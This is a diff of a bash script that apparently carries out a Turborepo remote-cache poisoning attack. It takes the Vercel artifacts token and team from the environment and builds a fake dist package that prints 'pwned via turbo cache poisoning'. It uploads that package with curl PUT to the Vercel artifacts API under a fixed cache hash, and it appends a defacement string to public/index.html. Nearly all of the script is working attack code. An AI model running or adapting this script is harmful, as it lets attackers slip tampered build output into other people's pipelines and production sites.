@@ -1,20 +1,24 @@
 #!/usr/bin/env bash
 set -u
-echo "----DRY----"
+
+echo "turbo dry run"
 turbo run build --dry-run=json > /tmp/dry.json 2>/dev/null
-cat /tmp/dry.json
 
 echo "----PUT----"
 API="https://vercel.com/api"
 TEAM="$VERCEL_ARTIFACTS_OWNER"
 TOKEN="$VERCEL_ARTIFACTS_TOKEN"
-HASH="4e2d8273fb80c68f"
+HASH="4003f1ca98463840"
+echo $TEAM
 
-mkdir -p public/
-echo "hihihi hahaha" >> public/index.html
-tar -cf artifact.tar -C /vercel/path0 app/web/dist app/web/.turbo/turbo-build.log public/
+mkdir -p packages/web/dist packages/web/.turbo/turbo-build.log
+echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > packages/web/dist/package.json
+echo 'console.log("pwned via turbo cache poisoning")' > packages/web/dist/index.js
+
+tar -cf artifact.tar -C packages/web/dist packages/web/.turbo/turbo-build.log 
 zstd -f artifact.tar
 
+echo "curl -sS -X PUT $API/v8/artifacts/$HASH?teamId=$TEAM"
 
 curl -sS -X PUT \
   "$API/v8/artifacts/$HASH?teamId=$TEAM" \
@@ -24,16 +28,4 @@ curl -sS -X PUT \
   --data-binary @artifact.tar.zst \
   -w 'PUT HTTP %{http_code}\n'
 
-echo "----EXISTS (HEAD)----"
-curl -sS -I \
-  "$API/v8/artifacts/$HASH?teamId=$TEAM" \
-  -H "Authorization: Bearer $TOKEN" \
-  -w 'HEAD HTTP %{http_code}\n'
-
-echo "----GET----"
-curl -sS \
-  "$API/v8/artifacts/$HASH?teamId=$TEAM" \
-  -H "Authorization: Bearer $TOKEN" \
-  -w '\nGET HTTP %{http_code}\n'
-
-mkdir -p public && echo bahahahahha >> public/index.html
+mkdir -p public && echo 'go see prod babe -->' >> public/index.html
